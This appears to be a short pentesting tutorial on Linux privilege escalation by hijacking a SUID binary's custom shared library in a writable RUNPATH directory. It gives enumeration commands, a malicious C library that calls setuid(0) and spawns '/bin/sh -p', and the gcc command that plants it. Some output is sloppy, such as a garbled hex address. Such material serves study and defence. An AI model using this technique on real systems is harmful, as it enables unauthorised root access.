# Shared Object Manipulation

A **shared object** is a compiled binary file that contains code and data that can be shared among multiple programs. In Unix-like operating systems, shared objects are typically represented by files with the `.so` (shared object) extension. They allow programs to utilize common libraries, reducing redundancy and saving memory, as multiple programs can load the same shared object into memory at runtime.

Some Binaries or programs might have custom object/libraries associated with them.\
If we have access to manipulate the custom object used by such program, we can get escalate privilege.

## Example

```
user@pc1:~$ ls -la dbs
-rwsr-xr-x 1 root root 1000 Nov  2 15:05 dbs
```

lets say there is a library with suid bit set.

### Viewing the shared object required for specific binary

Using `ldd` we can view the shaed object required.

```
user@pc1:~$ ldd dbs

.............................
libshared.so => /lib/x86_64-linux-gnu/thisislibrary.so (0x00007adf777654dsfaasdf)
.............................
.............................
```

from the output we can see, dbs binary's non standard library `thisislibrary.so`

Using `readelf` tool we can look at the path for the shared libraries.

```
user@pc1:~$ readelf -d dbs  | grep PATH
 0x00000000000000 (RUNPATH)            Library runpath: [/dollarboysushil]
```

From the output, we can say custom library is imported from `/dollarboysushil` directory

If we have write access to this directory, then we can add malicious library in this directory.

```c
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Hacked by dollarboysushil");
    setuid(0);
    system("/bin/sh -p");
} 
```

Compiling this malicious library

```
gcc malicious.c -fPIC -shared -o /dollarboysushil/thisislibrary.so
```

Now when we run the dbs binary, we will get shell as root.

```
root@pc1:~$ ./dbs 
Hacked by dollarboysushil
# whoami
root

```

